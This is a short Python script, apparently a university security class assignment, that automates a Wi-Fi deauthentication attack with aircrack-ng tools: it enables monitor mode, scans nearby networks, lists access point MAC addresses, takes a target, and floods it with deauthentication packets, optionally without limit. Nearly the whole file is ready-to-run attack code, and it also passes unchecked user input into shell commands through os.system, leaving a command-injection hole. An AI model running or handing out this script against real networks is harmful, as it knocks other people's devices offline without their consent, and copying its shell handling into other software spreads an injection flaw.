# Group: Broaden
# Class: CSC 447 001
# Date: 1 May 2023

import os

# Ask the user for the necessary information
interface = input("Enter the wireless interface name (e.g. wlan0): ")

# Start monitoring the wireless network
os.system("sudo airmon-ng start " + interface)

# Scan for nearby wireless networks
os.system("sudo airodump-ng " + interface + "mon")

# Display the list of MAC addresses
mac_addresses = []
with open(interface + "mon-01.csv", "r") as f:
    lines = f.readlines()
    for line in lines[1:]:
        mac_address = line.split(",")[0].strip()
        if mac_address != "BSSID":
            mac_addresses.append(mac_address)
            print(mac_address)

# Ask the user which MAC address to target
target_mac = input("Enter the MAC address of the target device: ")
if target_mac not in mac_addresses:
    print("Invalid MAC address. Please try again.")
    exit()

# Ask the user how many deauthentication packets to send
num_packets = input("Enter the number of deauthentication packets to send (0 for unlimited): ")

# Send deauthentication packets to the target device
os.system("sudo aireplay-ng -0 " + num_packets + " -a " + target_mac + " " + interface + "mon")

# Stop monitoring the wireless network
os.system("sudo airmon-ng stop " + interface + "mon")
